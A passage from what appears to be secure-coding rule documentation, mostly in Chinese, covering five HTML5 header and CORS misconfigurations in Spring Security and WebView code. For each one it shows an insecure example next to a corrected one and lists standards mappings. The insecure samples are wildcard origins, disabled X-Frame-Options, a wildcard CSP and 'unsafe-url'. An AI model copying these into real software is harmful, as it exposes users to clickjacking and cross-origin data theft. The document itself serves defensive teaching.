<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[17] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Missing-Framing-Protection"><a href="#HTML5-Missing-Framing-Protection" class="headerlink" title="HTML5: Missing Framing Protection"></a>HTML5: Missing Framing Protection</h4><h5 id="ABSTRACT-7"><a href="#ABSTRACT-7" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序不会限制浏览器从第三方站点呈现其内容。</p>
<h5 id="EXPLANATION-7"><a href="#EXPLANATION-7" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>允许将您的网站添加到框架会引发安全问题。例如，这可能引发 Clickjacking 漏洞或允许异常的跨框架通信。</p>
<p>默认情况下，Spring Security 等框架将 X-Frame-Options 标头包含在内，从而指示浏览器是否应对应用程序进行组帧。禁用或不设置此标头会引发与跨框架相关的漏洞。</p>
<p>示例 1：以下代码配置了受 Spring Security 保护的应用程序，以禁用 X-Frame-Options 标头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;frame-options disabled=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-7"><a href="#RECOMMENDATIONS-7" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将 X-Frame-Options 标头设置为额外的保护层。若从不需要对应用程序进行组帧，请将其值设置为 DENY；若需要由同源的其他应用程序或页面进行组帧，请将其值设置为 SAMEORIGIN。</p>
<p>默认情况下，Spring Security 会禁用 iframe 中的呈现。可自定义 X-Frame-Options 标头来满足应用程序的需求。</p>
<p>示例 2：以下代码将受 Spring Security 保护的应用程序配置为使用 SAMEORIGIN 策略： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;frame-options policy=&quot;SAMEORIGIN&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-7"><a href="#REFERENCES-7" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 1021 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[5] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.7 HTTP Security Headers Requirements </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[9] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Overly-Permissive-Content-Security-Policy"><a href="#HTML5-Overly-Permissive-Content-Security-Policy" class="headerlink" title="HTML5: Overly Permissive Content Security Policy"></a>HTML5: Overly Permissive Content Security Policy</h4><h5 id="ABSTRACT-8"><a href="#ABSTRACT-8" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>内容安全策略 (CSP) 配置了过于宽松的策略，可能造成安全风险。</p>
<h5 id="EXPLANATION-8"><a href="#EXPLANATION-8" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，使开发人员可以在浏览器中指定允许的安全相关行为，包括可从中检索内容的位置白名单。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。但配置不恰当的标头无法提供此额外的安全层。该策略是在 15 条指令的帮助下定义的，包括 8 条控制资源访问的指令：script-src、img-data-src、object-src、style_src、font-src、media-src、frame-src、connect-src。这 8 条指令将源列表作为值，该值指定站点可访问的域，以使用该指令涵盖的功能。开发人员可使用通配符 * 表示所有或部分数据源。其他源列表关键字（例如 ‘unsafe-inline’ 和 ‘unsafe-eval’）提供了对脚本执行的更精细控制，但可能有害。所有的指令都不是强制性的。浏览器允许对未列出的指令使用所有的数据源，或者允许从可选 default-src 指令中衍生其值。此外，此标头的规范也在不断发展。在 Firefox V23 和 IE V10 以前，它作为 X-Content-Security-Policy 实现，在 Chrome V25 以前，作为 X-Webkit-CSP 实现。这两个名称现在均已弃用，目前使用的标准名称为 Content Security Policy。鉴于指令数、两个弃用的备用名称以及在单个标头中相同标头和重复指令多次出现的处理方式，开发人员很有可能会错误地配置此标头。</p>
<p>示例 1：以下代码设置了过度宽松且不安全的 default-src 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;default-src &apos;*&apos;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-8"><a href="#RECOMMENDATIONS-8" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对于 CSP 源列表值，请使用受信任域的显式列表，而不要使用常规通配符 *。另外，避免使用任何允许潜在不安全脚本行为的指令，例如 ‘unsafe-inline’ 或 ‘unsafe-eval’。</p>
<p>示例 2：以下 Spring Security 应用程序会针对 default-src 指令设置特定域：</p>
<pre><code>&lt;http auto-config=&quot;true&quot;&gt;

    ...

    &lt;headers&gt;

        ...

        &lt;content-security-policy policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;

    &lt;/headers&gt;

&lt;/http&gt;
</code></pre><h5 id="REFERENCES-8"><a href="#REFERENCES-8" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Overly-Permissive-Message-Posting-Policy"><a href="#HTML5-Overly-Permissive-Message-Posting-Policy" class="headerlink" title="HTML5: Overly Permissive Message Posting Policy"></a>HTML5: Overly Permissive Message Posting Policy</h4><h5 id="ABSTRACT-9"><a href="#ABSTRACT-9" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序发布了目标源过于宽松的跨文档消息。</p>
<h5 id="EXPLANATION-9"><a href="#EXPLANATION-9" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML5 的一项新功能是跨文档消息传递。该功能允许脚本将消息发布到其他窗口。用户利用相应的 API 可指定目标窗口的源。不过，指定目标源时应小心谨慎，因为如果目标源过于宽松，恶意脚本就能趁机采用不当方式与受害者窗口进行通信，从而导致发生欺骗、数据被盗、转发及其他攻击。</p>
<p>示例 1：以下示例会使用通配符以编程方式指定要发送的消息的目标源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebMessage message = new WebMessage(WEBVIEW_MESSAGE);</span><br><span class="line"></span><br><span class="line">webview.postWebMessage(message, Uri.parse(&quot;*&quot;));</span><br></pre></td></tr></table></figure>
<p>使用 * 作为目标源的值表示无论源如何，脚本都会将消息发送到窗口。RECOMMENDATIONS</p>
<p>请不要将 * 作为目标源的值， 而是提供一个特定的目标源。</p>
<p>示例 2：以下代码会为目标源提供一个特定值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebMessage message = new WebMessage(WEBVIEW_MESSAGE);</span><br><span class="line"></span><br><span class="line">webview.postWebMessage(message, Uri.parse(&quot;http://www.trusted.com&quot;));</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-9"><a href="#REFERENCES-9" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Michael Schmidt HTML5 Web Security </p>
<p>[2] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens A Security Analysis of Next Generation Web Standards </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 942 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.6 HTTP Security Headers Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[10] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<h4 id="HTML5-Overly-Permissive-CORS-Policy"><a href="#HTML5-Overly-Permissive-CORS-Policy" class="headerlink" title="HTML5: Overly Permissive CORS Policy"></a>HTML5: Overly Permissive CORS Policy</h4><h5 id="ABSTRACT-10"><a href="#ABSTRACT-10" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序会定义过于宽松的跨源资源共享 (CORS) 策略。</p>
<h5 id="EXPLANATION-10"><a href="#EXPLANATION-10" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 HTML5 以前的版本中，Web 浏览器必须执行同源策略 (Same Origin Policy)，以确保使用 JavaScript 来访问某个网页内容时，JavaScript 和网页都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。如果定义了名为 Access-Control-Allow-Origin 的新 HTTP 头文件，HTML5 就支持使用 JavaScript 跨域访问数据。通过这个头文件，Web 服务器可定义允许使用跨源请求访问服务器域的其他域。不过，定义头文件时应小心谨慎，如果 CORS 策略过于宽松，恶意应用程序就能趁机采用不正当方式与受攻击的应用程序进行通信，从而导致发生欺骗、数据被盗、转发及其他攻击。</p>
<p>示例 1：在以下示例中，使用通配符以编程方式指定允许应用程序与其通信的域。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;websocket:handlers allowed-origins=&quot;*&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;websocket:mapping path=&quot;/myHandler&quot; handler=&quot;myHandler&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/websocket:handlers&gt;</span><br></pre></td></tr></table></figure>
<p>将 * 作为 Access-Control-Allow-Origin 头文件的值表明，该应用程序的数据可供在任何域上运行的 JavaScript 访问。</p>
<h5 id="RECOMMENDATIONS-9"><a href="#RECOMMENDATIONS-9" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要使用 * 作为 Access-Control-Allow-Origin 头文件的值。而应该提供可信赖的域的显式列表。</p>
<p>示例 2：下面的 Access-Control-Allow-Origin 头文件指定了一个显示可信赖的域。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;websocket:handlers allowed-origins=&quot;www.trusted.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;websocket:mapping path=&quot;/myHandler&quot; handler=&quot;myHandler&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/websocket:handlers&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-10"><a href="#REFERENCES-10" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] W3C Cross-Origin Resource Sharing</p>
<p>[2] Enable Cross-Origin Resource Sharing</p>
<p>[3] Michael Schmidt HTML5 Web Security</p>
<p>[4] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens A Security Analysis of Next Generation Web Standards</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[16] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="HTML5-Overly-Permissive-Referrer-Policy"><a href="#HTML5-Overly-Permissive-Referrer-Policy" class="headerlink" title="HTML5: Overly Permissive Referrer-Policy"></a>HTML5: Overly Permissive Referrer-Policy</h4><h5 id="ABSTRACT-11"><a href="#ABSTRACT-11" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将 Referrer-Policy 标头设置为 Unsafe-URL 可能会导致应用程序向第三方站点暴露敏感站点和用户数据（包括会话标记、用户名和密码）。</p>
<h5 id="EXPLANATION-11"><a href="#EXPLANATION-11" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，浏览器不会将包含来自 HTTPS 之请求的引用标头发送到未加密的 HTTP 链接。然而，请求目标若也为 HTTPS，无论来源如何，都将发送标头。开发人员可能会将敏感信息留在 URL 中，这些敏感信息会通过引用标头向第三方站点暴露。Referrer-Policy 标头会被引入，以控制与引用标头相关的浏览器行为。Unsafe-URL 选项会删除所有限制，并随每一个请求发送引用标头。 </p>
<p>示例：以下代码配置了受 Spring Security 保护的应用程序，以禁用默认的安全引用策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;referrer-policy policy=&quot;unsafe-url&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-10"><a href="#RECOMMENDATIONS-10" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>安全的做法是采用 same-origin 策略，这样可限制只有包含请求的引用标头才可发送到同源目标。Spring Security 等部分框架将此策略用作默认策略。在这些框架中，确保不更改安全默认值。</p>
<h5 id="REFERENCES-11"><a href="#REFERENCES-11" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Referrer-Policy </p>
<p>[2] OWASP OWASP List of useful HTTP headers </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 942 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002418, CCI-002420, CCI-002421, CCI-002422 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.6 HTTP Security Headers Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[22] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 732 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
